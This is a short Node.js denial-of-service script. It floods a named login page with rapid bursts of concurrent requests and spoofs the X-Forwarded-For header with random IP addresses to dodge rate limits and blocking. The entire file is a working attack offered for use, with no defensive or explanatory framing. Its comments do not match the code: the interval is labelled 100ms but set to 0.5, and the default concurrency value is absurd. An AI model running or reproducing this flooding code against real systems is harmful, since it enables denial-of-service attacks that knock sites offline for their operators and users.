const axios = require("axios");

// Target website
const TARGET_URL = "https://panel.orvixcloud.site/auth/login";

// Function to generate a random IP for spoofing
function getRandomIP() {
return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}
// Function to send a request
async function sendRequest() {
try {
const response = await axios.get(TARGET_URL, {
headers: {
"User-Agent":
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
"X-Forwarded-For": getRandomIP(), // Spoofed IP
},
});

console.log(`[SUCCESS] Response status: ${response.status}`);  
} catch (error) {  
    console.error(`[ERROR] Error: ${error.message}`);  
}

}

// Function to start rapid requests
function startAttack(concurrency = 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999) {
setInterval(async () => {
// Create multiple concurrent requests
const requests = Array.from({ length: concurrency }, () =>
sendRequest(),
);
await Promise.all(requests);
}, 0.5); // Executes every 100ms
}

// Start the bot with desired concurrency level
console.log("Starting the bot with high concurrency...");
startAttack(15); // Adjust concurrency (number of parallel requests)
